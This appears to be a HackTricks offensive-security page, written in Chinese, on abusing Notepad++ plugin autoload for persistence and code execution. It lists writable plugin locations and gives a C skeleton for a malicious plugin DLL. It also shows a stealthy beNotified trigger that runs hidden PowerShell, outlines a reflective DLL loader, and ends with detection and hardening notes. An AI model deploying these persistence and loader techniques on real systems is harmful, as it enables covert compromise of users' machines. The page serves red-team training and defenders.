# Notepad++ 插件自动加载持久化与执行

{{#include ../../banners/hacktricks-training.md}}

Notepad++ 启动时会**自动加载其 `plugins` 子文件夹中的所有插件 DLL**。将恶意插件放入任何**可写的 Notepad++ 安装目录**，即可在每次编辑器启动时于 `notepad++.exe` 中执行代码，可用于**持久化**、隐蔽的**初始执行**，或在编辑器以提升权限启动时充当**进程内加载器**。<sup>[[1]](#references)</sup>

从 **Notepad++ 7.6+** 开始，手动安装时应采用的目录布局是**每个插件使用一个子文件夹**（`plugins\<PluginName>\<PluginName>.dll`）。在**便携模式**下（`notepad++.exe` 旁存在 `doLocalConf.xml`），整个应用目录树都保留在该目录中，因此复制的管理员工具包往往会变成易于利用的用户可写执行入口。<sup>[[2]](#references)</sup>

## 可写的插件位置

- 标准安装：`C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll`（通常需要管理员权限才能写入）。<sup>[[1]](#references)</sup>
- 低权限操作者可用的可写选项：<sup>[[1]](#references)</sup>
  - 在用户可写的文件夹中使用**便携版 Notepad++**。
  - 将 `C:\Program Files\Notepad++` 复制到用户控制的路径（例如 `%LOCALAPPDATA%\npp\`），然后从该路径运行 `notepad++.exe`。
  - 搜索**管理员工具包**、解压后的 zip 副本，或已包含 `doLocalConf.xml` 且位于 `Program Files` 之外的帮助台工具包。
- 每个插件都在 `plugins` 下拥有自己的子文件夹，并会在启动时自动加载；菜单项会显示在 **Plugins** 菜单下。<sup>[[2]](#references)</sup>

快速排查：

```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```

## 插件加载点（执行原语）
Notepad++ 需要特定的**导出函数**。这些函数都会在初始化期间调用，因此提供了多个执行入口：<sup>[[1]](#references)</sup>
- **`DllMain`** — 在 DLL 加载时立即运行（第一个执行点）。
- **`setInfo(NppData)`** — 加载时调用一次，用于提供 Notepad++ 句柄；通常在此处注册菜单项。
- **`getName()`** — 返回菜单中显示的插件名称。
- **`getFuncsArray(int *nbF)`** — 返回菜单命令；即使为空，也会在启动期间调用。
- **`beNotified(SCNotification*)`** — 接收 Notepad++ / Scintilla 事件（可用于将 payload 延迟到用户操作或编辑器事件发生时执行）。
- **`messageProc(UINT, WPARAM, LPARAM)`** — 消息处理程序，适用于较大规模的数据交换。
- **`isUnicode()`** — 加载时检查的兼容性标志。

大多数导出函数都可以实现为**存根**；在 autoload 期间，可以从 `DllMain` 或上述任意回调中执行代码。

## 最小恶意插件骨架
编译一个包含预期导出函数的 DLL，并将其放入可写的 Notepad++ 文件夹下的 `plugins\\MyNewPlugin\\MyNewPlugin.dll`：<sup>[[1]](#references)</sup>

```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```

1. 构建 DLL（Visual Studio/MinGW）。
2. 在 `plugins` 下创建插件子文件夹，并将 DLL 放入其中。
3. 重启 Notepad++；DLL 会自动加载，执行 `DllMain` 及后续回调。

## 通过 `beNotified` 实现低噪声触发模式
出于 OPSEC 考量，许多 payload 不应从 `DllMain` 触发。更隐蔽的模式是让插件正常加载，然后仅在发生符合实际使用场景的编辑器事件后执行，例如**启动完成**、**缓冲区激活**或**输入的第一个字符**。

```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
  if (fired) return;
  if (n->nmhdr.code == NPPN_READY ||
      n->nmhdr.code == NPPN_BUFFERACTIVATED ||
      n->nmhdr.code == SCN_CHARADDED) {
    fired = true;
    WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
  }
}
```

这种方式比嘈杂的 `DllMain` beacon 更贴近公开的 offensive research：DLL 仍会在启动时自动加载，但恶意操作会延迟到 Notepad++ 确实处于使用状态时才执行。

## 将 plugin config directory 用作辅助存储
Notepad++ 提供了 `NPPM_GETPLUGINSCONFIGDIR`，该接口会返回**当前用户的 plugin 配置目录**。<sup>[[3]](#references)</sup> 恶意插件可以利用此目录，让磁盘上的 DLL 保持精简，同时将加密配置、暂存的 payload 或 tasking 文件存储在一个看起来与正常插件状态相符的路径中。

```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```

从操作角度来说，以下场景中这种方式很有用：
- 一个微小的自动加载 bootstrap DLL；
- 无需再次改动主 plugin binary，即可按用户进行 tasking；
- 将 **自动加载触发器** 与较重的第二阶段分开。

## Reflective loader plugin pattern
Weaponized plugin 可以将 Notepad++ 变成 **reflective DLL loader**：<sup>[[1]](#references)</sup>
- 提供一个精简的 UI/menu entry（例如“LoadDLL”）。
- 接受 **file path** 或 **URL**，用于获取 payload DLL。
- 将 DLL 以 reflective 方式映射到当前进程，并调用导出的入口点（例如获取的 DLL 中的 loader function）。
- 优势：复用一个看似良性的 GUI 进程，而不是启动新的 loader；payload 继承 `notepad++.exe` 的完整性级别（包括提升权限的上下文）。
- 权衡：将 **unsigned plugin DLL** 写入磁盘容易引起注意；一种实用的变体是仅将自动加载的 plugin 用作 stub，并将真正的 implant 加密后暂存于其他位置。

## 检测和加固说明
- 阻止或监控**对 Notepad++ plugin 目录的写入**（包括用户配置文件中的 portable 副本）；启用受控文件夹访问或应用程序允许列表。
- 对 `plugins` 目录下的**新 unsigned DLL**、portable Notepad++ 目录树的更改，以及来自 `notepad++.exe` 的异常**子进程/网络活动**发出警报。
- 建立合法 plugin 的基线，并调查任何导出常规 Notepad++ plugin 接口、同时还会启动 shell、PowerShell 或网络 beacon 的新 DLL。
- 仅通过 **Plugins Admin** 安装 plugin，并限制从不受信任路径执行 portable 副本。

## References

- [1] [TrustedSec - Notepad++ 插件：Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [2] [Notepad++ 用户手册 - 插件](https://npp-user-manual.org/docs/plugins/)
- [3] [Notepad++ 用户手册 - 插件通信](https://npp-user-manual.org/docs/plugin-communication/)
{{#include ../../banners/hacktricks-training.md}}
